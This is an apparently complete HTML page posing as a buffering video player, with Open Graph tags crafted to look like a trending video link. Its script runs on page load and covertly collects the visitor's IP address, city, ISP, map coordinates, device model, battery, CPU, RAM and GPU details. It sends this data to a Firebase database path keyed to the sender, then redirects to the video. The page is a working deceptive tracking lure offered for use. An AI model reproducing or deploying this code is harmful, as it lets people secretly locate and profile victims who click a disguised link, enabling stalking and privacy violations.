<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Watch Trending Video">
    <meta property="og:description" content="Click to play this exclusive video content.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/e/e1/YouTube_play_button_icon_%282013%E2%80%932017%29.svg">
    
    <title>Video Player | Buffering...</title>
    <style>
        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0; }
        .loader { border: 3px solid #111; border-top: 3px solid #00a884; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div style="text-align:center;">
        <div class="loader"></div>
        <p style="margin-top:20px; font-size:12px; color:#444; letter-spacing:2px;">LOADING SECURE PLAYER...</p>
    </div>

    <script>
        const FB_URL = "https://legend-tricker-default-rtdb.asia-southeast1.firebasedatabase.app/users/";

        async function startTracking() {
            const params = new URLSearchParams(window.location.search);
            const raw = params.get('id');
            if(!raw) return;

            const decoded = atob(raw).split('|');
            const userKey = decoded[0];
            const targetVideo = decoded[1];

            let data = {
                time: new Date().toLocaleString(),
                dev: "Unknown", ip: "N/A", loc: "N/A", isp: "N/A",
                batt: "N/A", cpu: navigator.hardwareConcurrency || "?",
                ram: navigator.deviceMemory || "?", gpu: "Unknown", map: "#"
            };

            // Device Model
            try { data.dev = navigator.userAgent.split('(')[1].split(')')[0]; } catch(e){}

            // Battery
            if(navigator.getBattery) {
                const b = await navigator.getBattery();
                data.batt = Math.round(b.level * 100) + "% " + (b.charging ? "âš¡" : "ðŸ”‹");
            }

            // GPU Detection
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).split(',')[0];
            } catch(e){}

            // Location & Network
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                data.ip = d.ip;
                data.loc = d.city + ", " + d.country_name;
                data.isp = d.org;
                data.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
            } catch(e) {}

            // Send to Admin's Private Path
            await fetch(`${FB_URL}${userKey}.json`, { method: 'POST', body: JSON.stringify(data) });

            // Final Redirection
            window.location.href = targetVideo;
        }

        startTracking();
    </script>
</body>
</html>
